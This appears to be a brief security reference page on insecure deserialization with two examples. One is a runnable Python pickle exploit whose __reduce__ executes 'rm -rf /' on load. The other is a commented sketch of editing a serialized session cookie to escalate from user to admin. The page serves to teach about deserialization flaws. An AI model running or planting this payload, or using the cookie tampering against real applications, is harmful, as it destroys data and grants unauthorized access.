# Insecure Deserialization - Attack Vectors

## Python Pickle Attack

```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('rm -rf /',))

# Attacker creates malicious pickle
malicious_data = pickle.dumps(Exploit())

# Victim deserializes - BOOM!
pickle.loads(malicious_data)  # Executes rm -rf /
```

## Session Cookie Manipulation

```python
# Application serializes user object to cookie
cookie_data = serialize(user_object)

# Attacker modifies serialized data
# Changes role from 'user' to 'admin'
# Server deserializes without validation
# Attacker gains admin access
```
